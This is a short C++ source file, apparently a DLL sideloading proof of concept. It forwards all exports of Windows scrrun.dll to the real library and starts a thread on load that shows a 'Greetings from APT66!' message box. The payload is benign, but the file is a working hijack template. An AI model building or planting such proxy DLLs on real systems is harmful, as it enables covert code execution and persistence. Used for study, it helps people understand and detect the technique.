// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

// https://github.com/magnusstubman/dll-exports/blob/main/win10.19042/System32/scrrun.dll.cpp
#pragma comment(linker, "/export:DLLGetDocumentation=\"C:\\Windows\\System32\\scrrun.DLLGetDocumentation\"")
#pragma comment(linker, "/export:DllCanUnloadNow=\"C:\\Windows\\System32\\scrrun.DllCanUnloadNow\"")
#pragma comment(linker, "/export:DllGetClassObject=\"C:\\Windows\\System32\\scrrun.DllGetClassObject\"")
#pragma comment(linker, "/export:DllRegisterServer=\"C:\\Windows\\System32\\scrrun.DllRegisterServer\"")
#pragma comment(linker, "/export:DllUnregisterServer=\"C:\\Windows\\System32\\scrrun.DllUnregisterServer\"")
#pragma comment(linker, "/export:DoOpenPipeStream=\"C:\\Windows\\System32\\scrrun.DoOpenPipeStream\"")

void stuff() {
    MessageBox(NULL, (LPCWSTR)L"Greetings from APT66!", (LPCWSTR)L"Yo", MB_OK);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)stuff, 0, 0, NULL);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

